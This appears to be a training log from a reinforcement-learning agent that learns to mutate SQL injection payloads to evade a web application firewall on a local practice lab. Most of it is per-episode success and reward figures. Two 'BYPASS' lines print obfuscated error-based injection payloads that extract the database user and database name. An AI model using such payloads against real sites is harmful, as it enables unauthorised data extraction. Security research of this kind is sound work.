/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
 Seed        : 3
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-46.00
  Ep   20 | SR=0% | Steps=15.0 | R=-47.06
  Ep   30 | SR=0% | Steps=15.0 | R=-47.69
  Ep   40 | SR=0% | Steps=15.0 | R=-46.77
  Ep   50 | SR=0% | Steps=15.0 | R=-45.02
  Ep   60 | SR=0% | Steps=15.0 | R=-45.73
  Ep   70 | SR=0% | Steps=15.0 | R=-46.99
  Ep   80 | SR=0% | Steps=15.0 | R=-47.29
  Ep   90 | SR=0% | Steps=15.0 | R=-46.25
  Ep  100 | SR=0% | Steps=15.0 | R=-46.32
  Ep  110 | SR=0% | Steps=15.0 | R=-45.79
  Ep  120 | SR=0% | Steps=15.0 | R=-46.02
  Ep  130 | SR=0% | Steps=15.0 | R=-45.12
  Ep  140 | SR=0% | Steps=15.0 | R=-46.41
  Ep  150 | SR=0% | Steps=15.0 | R=-45.19
  Ep  160 | SR=0% | Steps=15.0 | R=-45.80
  Ep  170 | SR=0% | Steps=15.0 | R=-47.00
  Ep  180 | SR=0% | Steps=15.0 | R=-46.88
  Ep  190 | SR=0% | Steps=15.0 | R=-46.79
  Ep  200 | SR=0% | Steps=15.0 | R=-45.80
  Ep  210 | SR=0% | Steps=15.0 | R=-46.20
  Ep  220 | SR=0% | Steps=15.0 | R=-46.68
  Ep  230 | SR=0% | Steps=15.0 | R=-46.49
  Ep  240 | SR=0% | Steps=15.0 | R=-44.95
  Ep  250 | SR=0% | Steps=15.0 | R=-45.40
  Ep  260 | SR=0% | Steps=15.0 | R=-45.92
  Ep  270 | SR=0% | Steps=15.0 | R=-45.79
  Ep  280 | SR=0% | Steps=15.0 | R=-45.58
  Ep  290 | SR=0% | Steps=15.0 | R=-46.58
  Ep  300 | SR=0% | Steps=15.0 | R=-44.93
  Ep  310 | SR=0% | Steps=15.0 | R=-47.17
  Ep  320 | SR=0% | Steps=15.0 | R=-46.70
  Ep  330 | SR=0% | Steps=15.0 | R=-46.29
  Ep  340 | SR=0% | Steps=15.0 | R=-45.15
  Ep  350 | SR=0% | Steps=15.0 | R=-45.82
  Ep  360 | SR=0% | Steps=15.0 | R=-47.12
  Ep  370 | SR=0% | Steps=15.0 | R=-45.75
  Ep  380 | SR=0% | Steps=15.0 | R=-44.23
  Ep  390 | SR=0% | Steps=15.0 | R=-47.27
  Ep  400 | SR=0% | Steps=15.0 | R=-46.40
  Ep  410 | SR=0% | Steps=15.0 | R=-44.13
  Ep  420 | SR=0% | Steps=15.0 | R=-45.90
  Ep  430 | SR=0% | Steps=15.0 | R=-45.53
  Ep  440 | SR=0% | Steps=15.0 | R=-46.10
  Ep  450 | SR=0% | Steps=15.0 | R=-45.90
  Ep  460 | SR=0% | Steps=15.0 | R=-45.62
  Ep  470 | SR=0% | Steps=15.0 | R=-44.73
  Ep  480 | SR=0% | Steps=15.0 | R=-45.44
  Ep  490 | SR=0% | Steps=15.0 | R=-45.12
  Ep  500 | SR=0% | Steps=15.0 | R=-46.39
  Ep  510 | SR=0% | Steps=15.0 | R=-45.75
  Ep  520 | SR=0% | Steps=15.0 | R=-45.65
  Ep  530 | SR=0% | Steps=15.0 | R=-45.00
  Ep  540 | SR=0% | Steps=15.0 | R=-44.66
  Ep  550 | SR=0% | Steps=15.0 | R=-46.08
  Ep  560 | SR=0% | Steps=15.0 | R=-45.64
  Ep  570 | SR=0% | Steps=15.0 | R=-44.75
  Ep  580 | SR=0% | Steps=15.0 | R=-46.50
  Ep  590 | SR=0% | Steps=15.0 | R=-45.02
  [BYPASS] Ep  595 | steps=10 | seq=tab_space -> case -> func_sp_lit -> concat_char -> hash_nl -> ident_backtick -> null_byte -> url_mid_char -> func_sp_cmt -> between_space
           payload: 1'%09aNd%09EXP(~(SELeCt%09*%09frOM%09(seleCt%09(user%a0()))a));%00  *** NEW SHORTEST ***
  Ep  600 | SR=10% | Steps=14.5 | R=-42.65
  Ep  610 | SR=0% | Steps=15.0 | R=-44.08
  Ep  620 | SR=0% | Steps=15.0 | R=-45.18
  Ep  630 | SR=0% | Steps=15.0 | R=-44.50
  Ep  640 | SR=0% | Steps=15.0 | R=-45.92
  Ep  650 | SR=0% | Steps=15.0 | R=-42.90
  Ep  660 | SR=0% | Steps=15.0 | R=-44.08
  Ep  670 | SR=0% | Steps=15.0 | R=-45.23
  [BYPASS] Ep  676 | steps=7 | seq=newline -> func_sp_nbsp -> url_encode -> between_space -> between_space -> agg_swap -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00  *** NEW SHORTEST ***
  Ep  680 | SR=10% | Steps=14.2 | R=-40.31
  Ep  690 | SR=0% | Steps=15.0 | R=-44.38
  Ep  700 | SR=0% | Steps=15.0 | R=-43.62
  Ep  710 | SR=0% | Steps=15.0 | R=-44.28
  Ep  720 | SR=0% | Steps=15.0 | R=-45.53
  Ep  730 | SR=0% | Steps=15.0 | R=-45.26
  Ep  740 | SR=0% | Steps=15.0 | R=-44.86
  Ep  750 | SR=0% | Steps=15.0 | R=-43.84
  Ep  760 | SR=0% | Steps=15.0 | R=-45.64
  Ep  770 | SR=0% | Steps=15.0 | R=-43.47
  Ep  780 | SR=0% | Steps=15.0 | R=-43.50
  Ep  790 | SR=0% | Steps=15.0 | R=-44.56
  Ep  800 | SR=0% | Steps=15.0 | R=-43.85
  Ep  810 | SR=0% | Steps=15.0 | R=-43.38
  Ep  820 | SR=0% | Steps=15.0 | R=-44.56
  Ep  830 | SR=0% | Steps=15.0 | R=-44.56
  Ep  840 | SR=0% | Steps=15.0 | R=-43.07
  Ep  850 | SR=0% | Steps=15.0 | R=-43.61
  Ep  860 | SR=0% | Steps=15.0 | R=-44.14
  Ep  870 | SR=0% | Steps=15.0 | R=-44.19
  Ep  880 | SR=0% | Steps=15.0 | R=-44.28
  Ep  890 | SR=0% | Steps=15.0 | R=-44.56
